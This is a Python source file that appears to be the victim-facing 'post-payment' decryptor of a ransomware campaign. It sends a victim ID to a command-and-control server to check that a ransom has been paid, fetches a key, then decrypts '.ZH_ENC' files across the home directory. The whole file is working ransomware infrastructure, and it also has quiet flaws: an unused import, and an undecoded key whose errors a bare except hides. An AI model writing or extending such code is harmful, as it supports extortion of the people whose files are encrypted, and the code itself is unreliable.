# decryptor.py (Post-Payment)
import os, requests
from cryptography.fernet import Fernet
from Crypto.Cipher import AES

class ZhDecryptor:
    def __init__(self, victim_id):
        self.c2_url = "https://c2.zhrackservices[.]com"
        self.victim_id = victim_id
        self.encrypted_marker = ".ZH_ENC"
        
    def _get_decryption_key(self):
        response = requests.get(f"{self.c2_url}/check_payment/{self.victim_id}")
        if response.status_code == 200:
            return response.json().get('key')
        return None

    def decrypt_file(self, file_path, key):
        try:
            with open(file_path, 'rb') as f:
                nonce, tag, ciphertext = [ f.read(x) for x in (16, 16, -1) ]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            data = cipher.decrypt_and_verify(ciphertext, tag)
            
            original_path = file_path[:-len(self.encrypted_marker)]
            with open(original_path, 'wb') as f:
                f.write(data)
            
            os.remove(file_path)
        except:
            pass

    def start_decryption(self):
        key = self._get_decryption_key()
        if not key:
            print("Pagamento não verificado!")
            return
        
        for root, dirs, files in os.walk(os.path.expanduser("~")):
            for file in files:
                if file.endswith(self.encrypted_marker):
                    self.decrypt_file(os.path.join(root, file), key)

if __name__ == '__main__':
    victim_id = input("Insira seu Victim ID: ")
    ZhDecryptor(victim_id).start_decryption()
